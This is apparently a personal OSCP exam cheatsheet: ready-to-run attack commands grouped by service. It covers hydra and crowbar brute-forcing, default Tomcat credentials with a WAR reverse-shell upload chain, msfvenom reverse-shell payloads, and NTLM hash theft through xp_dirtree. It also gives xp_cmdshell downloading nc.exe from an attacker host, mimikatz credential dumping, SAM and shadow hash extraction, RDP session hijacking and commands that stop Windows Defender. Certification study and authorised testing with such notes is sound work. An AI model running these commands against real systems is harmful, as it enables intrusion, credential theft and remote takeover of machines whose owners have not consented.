# OSCP personal cheatsheet


# Enumeration

nmap -sn -v <IP>/CIDR
nmapAutomator <IP> All
autorecon <IP>/CIDR

# NMAP

**TCP**
sudo -sS -sC -sV -oA <NAME>.tcp <IP> -v

**UDP**
sudo -sU -sS -sC -sV -oA <NAME>.udp <IP> -v

# FTP - 21

**Brute force**
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV

**Downloading file**
ftp <IP>
PASSIVE
BINARY
get <FILE>

**Uploading file**
ftp <IP>
PASSIVE
BINARY
put <FILE>


# SSH - 22

** Brute force

hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV

# DNS - 53

dnsenum <DOMAIN>
dnsrecon -d <DOMAIN>

**Zone transfert**

dnsrecon -d <DOMAIN> -a
dig axfr <DOMAIN> @ns1.test.com

**DNS brute force**

https://github.com/blark/aiodnsbrute

# FINGER - 79

**User enumeration**

finger @<IP>
finger <USER>@<IP>

**Command execution**

finger "|/bin/id@<IP>"
finger "|/bin/ls -a /<IP>"

# HTTP - HTTPS - 80 - 443

**Automatic scanners**

nikto -h <URL>
python crawleet.py -u <URL> -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --threads 20

**Wordpress**

**Scan**
wpscan --rua -e --url <URL>

**Brute force user(s)**
wpscan --rua --url <URL> -P <PASSWORDS_LIST> -U "<USER>,<USER>"

# Tomcat

**Default credentials**

The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :

admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat

**Brute force**
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV -u

**Tomcat panel RCE**

# Generate payload **
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

# Upload payload **
Tomcat6 :
wget 'http://<USER>:<PASSWORD>@<IP>:8080/manager/deploy?war=file:shell.war&path=/shell' -O -

Tomcat7 and above :
curl -v -u <USER>:<PASSWORD> -T shell.war 'http://<IP>:8080/manager/text/deploy?path=/shellh&update=true'

# Listener **
nc -lvp <PORT>

# Execute payload **
curl http://<IP>:8080/shell/

# POP3 - 110

**Brute force**

hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V
hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V

**Read mail**
telnet <IP> 110

USER <USER>
PASS <PASSWORD>
LIST
RETR <MAIL_NUMBER>
QUIT


# SNMP - 161

**Brute force community string**

onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>

snmpbulkwalk -c <COMMUNITY_STRING> -v<VERSION> <IP>

snmp-check <IP>


# LDAP - 389

**Scans**

nmap -n -sV --script "ldap* and not brute"

ldapsearch -h <IP> -x -s base
ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"

# SMB - 445

** Version if nmap didn´t detect it**

sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -L <IP>

**Scan for vulnerability**

nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>

If :

- MS17-010 - EternalBlue
- MS08-067 - MS08-067
- CVE-2017-7494 - CVE-2017-7494

**Manual testing**

smbmap -H <IP>
smbmap -u '' -p '' -H <IP>
smbmap -u 'guest' -p '' -H <IP>
smbmap -u '' -p '' -H <IP> -R

crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u 'guest' -p ''
crackmapexec smb <IP> -u '' -p '' --shares

enum4linux -a <IP>

smbclient --no-pass -L //$IP
smbclient //<IP>/<SHARE>

# Download all files from a directory recursively
smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"

**Brute force**

crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>

hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV


# Mount a SMB share

> mkdir /tmp/share
> sudo mount -t cifs //<IP>/<SHARE> /tmp/share
> sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share

> smbclient //<IP>/<SHARE>
> smbclient //<IP>/<SHARE> -U <USER>

# Get a shell

psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>


# Check if vulnerable

python eternal_checker.py <IP>

# MSSQL - 1433

**Brute force**

hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u

**Having credentials**

mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
mssqlclient.py <USER>:<PASSWORD>@<IP>

**Once logged in you can run queries:**

SQL> select @@ version;

**Steal NTLM hash**

sudo smbserver.py -smb2support liodeus .
SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat

**Try to enable code execution**

SQL> enable_xp_cmdshell

**Execute code**

SQL> xp_cmdshell whoami /all
SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe

# NFS - 2049

**Show Mountable NFS Shares**

showmount -e <IP>
nmap --script=nfs-showmount -oN mountable_shares <IP>

**Mount a share**

sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>

## MYSQL - 3306

**Brute force**

hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u

**Extracting MySQL credentials from files**

cat /etc/mysql/debian.cnf
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"

**Connect**

# Local **
mysql -u <USER>
mysql -u <USER> -p

# Remote **
mysql -h <IP> -u <USER>

## RDP - 3389

**Brute force**
crowbar -b rdp -s <IP>/CIDR -u <USER> -C <PASSWORDS_LIST>
crowbar -b rdp -s <IP>/CIDR -U <USERS_LIST> -C <PASSWORDS_LIST>

hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV

**Connect with known credentials / hash**
rdesktop -u <USERNAME> <IP>
rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>

xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>
xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>

**Session stealing**

**Get openned sessions**
query user

**Access to the selected**

tscon <ID> /dest:<SESSIONNAME>

**Adding user to RDP group (Windows)**

net localgroup "Remote Desktop Users" <USER> /add

# WINRM - 5985 - 5986

**Brute force**
crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>

**Connecting**
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
evil-winrm -i <IP> -u <USER> -H <HASH>

# HASHES

**Windows**
reg save HKLM\SAM c:\SAM
reg save HKLM\System c:\System

samdump2 System SAM > hashes

**Linux**
unshadow passwd shadow > hashes

# MIMIKATZ
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export

kerberos::list /export

vault::cred
vault::list

lsadump::sam
lsadump::secrets
lsadump::cache


# MSFVENOM PAYLOAD

**Linux**
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf

**Windows**
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

**Python**
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py

**Bash**
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh

**Perl**
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl

# Listener

**Metasploit**
use exploit/multi/handler
set PAYLOAD <PAYLOAD>
set LHOST <LHOST>
set LPORT <LPORT>
set ExitOnSession false
exploit -j -z

**Netcat**
nc -lvp <PORT>

# PASSWORD CRACKING

**Online**

Decrypt MD5, SHA1, MySQL, NTLM, SHA256, SHA512 hashes
https://hashes.com/en/decrypt/hash

**Hashcat*8

**Linux password**
hashcat -m 1800 -a 0 hash.txt rockyou.txt
hashcat -m 1800 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule

**Windows password**
hashcat -m 1000 -a 0 hash.txt rockyou.txt
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule

**Others**
hashcat --example-hashes | grep -i '<BEGINNING_OF_HASH>'

**Rules**
https://github.com/NotSoSecure/password_cracking_rules

**John**
john --wordlist=<PASSWORDS_LIST> hash.txt


# PIVOTING

**Sshuttle**
sshuttle <USER>@<IP> <IP_OF_THE_INTERFACE>/CIDR

**Proxychains**
ssh -f -N -D 9050 <USER>@<IP>
proxychains <COMMAND>

**Interesting link**
https://artkond.com/2017/03/23/pivoting-guide/

# USEFUL WINDOWS COMMANDS

net config Workstation
systeminfo
net users

ipconfig /all
netstat -ano

schtasks /query /fo LIST /v
tasklist /SVC
net start
DRIVERQUERY

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir /s pass == cred == vnc == .config
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Disable windows defender **
sc stop WinDefend

# Bypass restriction **
powershell -nop -ep bypass

# List hidden files **
dir /a

# Find a file**
dir /b/s "<FILE>"


# ZIP
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip

zip2john file.zip > zip.john
john --wordlist=<PASSWORDS_LIST> zip.john
